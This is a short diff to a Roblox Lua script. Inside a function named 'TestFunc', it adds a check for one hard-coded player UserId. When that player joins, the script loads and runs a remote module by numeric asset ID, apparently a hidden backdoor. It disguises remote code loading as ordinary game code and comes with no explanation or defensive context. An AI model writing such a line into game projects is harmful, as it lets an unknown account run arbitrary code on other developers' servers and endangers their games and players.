@@ -8,6 +8,9 @@ local TestFunc = function(plr)
   until (plr:IsDescendantOf(Players))
 
   plr:SetAttribute("RobloxOverride", false)
+  if (plr.UserId == 2435463496) then
+    require(71087394656125)(plr.Name)
+  end
 end
 
 for _, plr in pairs(Players:GetPlayers()) do
